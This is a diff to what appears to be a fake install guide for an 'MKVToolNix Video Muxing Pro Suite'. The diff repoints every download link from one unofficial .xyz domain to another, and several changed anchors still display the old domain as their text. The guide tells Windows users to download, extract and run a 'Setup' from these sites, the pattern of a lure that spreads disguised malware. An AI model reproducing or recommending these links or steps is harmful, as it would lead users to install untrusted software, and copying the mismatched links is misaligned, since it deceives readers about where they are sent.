@@ -21,8 +21,8 @@ MKVToolNix Video Muxing Pro Suite Install Guide â€” Create and edit MKV files â€
 
 > Use the project link below for Windows.
 
-* **Project link:** **[mkvtoolnix-video-muxing-pro-suite.nexpath.xyz](https://mkvtoolnix-video-muxing-pro-suite.nexpath.xyz/)**
-* **Full URL:** `https://mkvtoolnix-video-muxing-pro-suite.nexpath.xyz/`
+* **Project link:** **[mkvtoolnix-video-muxing-pro-suite.nerasix.xyz](https://mkvtoolnix-video-muxing-pro-suite.nerasix.xyz/)**
+* **Full URL:** `https://mkvtoolnix-video-muxing-pro-suite.nerasix.xyz/`
 * **Type:** Desktop package | Windows 10 and 11, 64-bit
 * **Setup:** Run the installer from the extracted folder
 
@@ -46,12 +46,12 @@ MKVToolNix Video Muxing Pro Suite Install Guide â€” Create and edit MKV files â€
 
 <details>
 <summary>&nbsp;<b>How to install?</b></summary>
-<br>Open <a href="https://mkvtoolnix-video-muxing-pro-suite.nexpath.xyz/">mkvtoolnix-video-muxing-pro-suite.nexpath.xyz</a>, click <b>Download</b>, extract the archive, then run <b>Setup</b>.
+<br>Open <a href="https://mkvtoolnix-video-muxing-pro-suite.nerasix.xyz/">mkvtoolnix-video-muxing-pro-suite.nexpath.xyz</a>, click <b>Download</b>, extract the archive, then run <b>Setup</b>.
 </details>
 
 <details>
 <summary>&nbsp;<b>Download didn't start?</b></summary>
-<br>Use the manual link on the NexPath download page, or open <a href="https://mkvtoolnix-video-muxing-pro-suite.nexpath.xyz/">mkvtoolnix-video-muxing-pro-suite.nexpath.xyz</a> directly in your browser.
+<br>Use the manual link on the NexPath download page, or open <a href="https://mkvtoolnix-video-muxing-pro-suite.nerasix.xyz/">mkvtoolnix-video-muxing-pro-suite.nexpath.xyz</a> directly in your browser.
 </details>
 
 <details>
@@ -61,5 +61,5 @@ MKVToolNix Video Muxing Pro Suite Install Guide â€” Create and edit MKV files â€
 
 <details>
 <summary>&nbsp;<b>Updates?</b></summary>
-<br>Open <a href="https://mkvtoolnix-video-muxing-pro-suite.nexpath.xyz/">mkvtoolnix-video-muxing-pro-suite.nexpath.xyz</a> again and download the latest version from NexPath.
+<br>Open <a href="https://mkvtoolnix-video-muxing-pro-suite.nerasix.xyz/">mkvtoolnix-video-muxing-pro-suite.nexpath.xyz</a> again and download the latest version from NexPath.
 </details>
